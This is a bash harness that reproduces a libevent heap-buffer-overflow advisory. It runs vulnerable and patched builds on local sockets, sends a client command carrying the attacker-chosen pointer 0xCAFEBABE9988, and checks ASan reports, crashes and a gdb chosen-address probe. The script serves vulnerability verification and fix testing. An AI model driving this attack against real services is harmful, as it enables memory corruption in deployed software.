#!/bin/bash
# libevent CVE-2026-63388 / GHSA-cvq5-vrvr-j338 staged reproduction matrix.
# All servers are started by this script; AF_UNIX paths are local and the TCP
# control binds 127.0.0.1 only. No external target is contacted.
set -uo pipefail
D="$(cd "$(dirname "$0")" && pwd)"
E="$D/evidence"
mkdir -p "$E"
SOCK=/tmp/libevent_r1.sock
PASS=0; FAIL=0
ok()  { PASS=$((PASS+1)); printf 'PASS %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf 'FAIL %s\n' "$1"; }
has() { local n="$1" f="$2" p="$3"; if grep -Eq -- "$p" "$f" 2>/dev/null; then ok "$n"; else bad "$n [missing: $p]"; fi; }
hasnt() { local n="$1" f="$2" p="$3"; if grep -Eq -- "$p" "$f" 2>/dev/null; then bad "$n [unexpected: $p]"; else ok "$n"; fi; }
wait_sock() { for i in $(seq 1 100); do [ -S "$SOCK" ] && return 0; sleep 0.05; done; return 1; }
if [ ! -x "$D/build-vuln-asan/r1_server_threaded" ] || [ ! -x "$D/build-fixed-asan/r1_server_threaded" ]; then
    bash "$D/bootstrap.sh" || exit 1
fi

run_server() {  # variant mode out -> prints yes|no (server alive after attack)
    local variant="$1" mode="$2" out="$3" pid
    rm -f "$SOCK"
    "$D/build-$variant-asan/r1_server_threaded" ${mode:+"$mode"} >"$out" 2>&1 &
    pid=$!
    if [ "$mode" = tcp ]; then sleep 0.5; else wait_sock || true; fi
    case "$mode" in
        tcp)   "$D/build-vuln-prod/r1_client" tcp >"$out.client" 2>&1 || true ;;
        attack|*) "$D/build-vuln-prod/r1_client" set 102 0xCAFEBABE9988 >"$out.client" 2>&1 || true ;;
    esac
    sleep 0.7
    if kill -0 "$pid" 2>/dev/null; then echo yes; else echo no; fi
    kill -9 "$pid" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK"
}

echo '=== pins ==='
for spec in \
  'libevent-vuln-1b7cc9b5.tar.gz:86dde8dfe1e2f60f954547e5f48cc3bd2570f051bcf4403a8c96f5ee45c92b71' \
  'libevent-fixed-52057cb3.tar.gz:718ea8883dec950adde4449c0419613f0b0a9346c1b3e1adfa5c73d6a5ec3bd0' \
  'fix-52057cb3.patch:643fe7edfdbeac3009722599cc36d079eb72698e14f71e36b42d7a99a8396d62'; do
    f="${spec%%:*}"; want="${spec##*:}"; got=$(sha256sum "$D/pins/$f" | cut -d' ' -f1)
    if [ "$got" = "$want" ]; then ok "pin $f sha256"; else bad "pin $f sha256 got $got"; fi
done
has 'vulnerable sink is unchecked memcpy' "$D/src-vuln/bufferevent_sock.c" 'EVUTIL_ASSERT\(addrlen <= sizeof\(bev_p->conn_address\)\)'
has 'fixed sink checks length and returns error' "$D/src-fixed/bufferevent_sock.c" 'return EVUTIL_EAI_FAIL'
has 'fixed conn_address widened to sockaddr_storage' "$D/src-fixed/bufferevent-internal.h" 'struct sockaddr_storage conn_address'

echo '=== builds ==='
for b in build-vuln-asan/r1_server_threaded build-vuln-prod/r1_server_threaded \
         build-vuln-prod/r1_client build-fixed-asan/r1_server_threaded \
         build-fixed-prod/r1_server_threaded; do
    if [ -x "$D/$b" ]; then ok "binary $b"; else bad "binary $b missing"; fi
done

echo '=== ASan vulnerable attack (AF_UNIX abstract name) ==='
A="$E/asan-vuln-attack.log"
alive=$(run_server vuln attack "$A")
has 'ASan heap-buffer-overflow' "$A" 'AddressSanitizer: heap-buffer-overflow'
has 'ASan WRITE of size 110' "$A" 'WRITE of size 110'
has 'ASan sink http.c:4686' "$A" 'http\.c:4686'
has 'ASan allocation 520-byte region' "$A" '520-byte region'
has 'ASan allocated by bufferevent_socket_new' "$A" 'bufferevent_socket_new'
if [ "$alive" = no ]; then ok 'vulnerable ASan server aborts'; else bad 'vulnerable ASan server survived attack'; fi

echo '=== ASan vulnerable loopback-TCP control (16-byte sockaddr_in) ==='
S="$E/asan-vuln-tcp.log"
alive=$(run_server vuln tcp "$S")
hasnt 'loopback TCP: no ASan report' "$S" 'AddressSanitizer'
if [ "$alive" = yes ]; then ok 'loopback TCP: server alive'; else bad 'loopback TCP: server died'; fi

echo '=== ASan fixed attack control ==='
F="$E/asan-fixed-attack.log"
alive=$(run_server fixed attack "$F")
hasnt 'fixed: no ASan report' "$F" 'AddressSanitizer'
if [ "$alive" = yes ]; then ok 'fixed: server alive'; else bad 'fixed: server died'; fi

echo '=== production vulnerable / fixed ==='
rm -f "$SOCK"; "$D/build-vuln-prod/r1_server_threaded" >"$E/prod-vuln-attack.log" 2>&1 & pid=$!
wait_sock || true
"$D/build-vuln-prod/r1_client" set 102 0xCAFEBABE9988 >"$E/prod-vuln-attack.client" 2>&1 || true
sleep 0.8
if kill -0 "$pid" 2>/dev/null; then bad 'production vulnerable server survived chosen pointer'; else ok 'production vulnerable server crashed'; fi
kill -9 "$pid" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; rm -f "$SOCK"

rm -f "$SOCK"; "$D/build-fixed-prod/r1_server_threaded" >"$E/prod-fixed-attack.log" 2>&1 & pid=$!
wait_sock || true
"$D/build-vuln-prod/r1_client" set 102 0xCAFEBABE9988 >"$E/prod-fixed-attack.client" 2>&1 || true
sleep 0.8
if kill -0 "$pid" 2>/dev/null; then ok 'production fixed server alive'; else bad 'production fixed server died'; fi
kill -9 "$pid" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; rm -f "$SOCK"

echo '=== chosen-address probe (production build under gdb) ==='
bash "$D/run-probe.sh" || true
printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
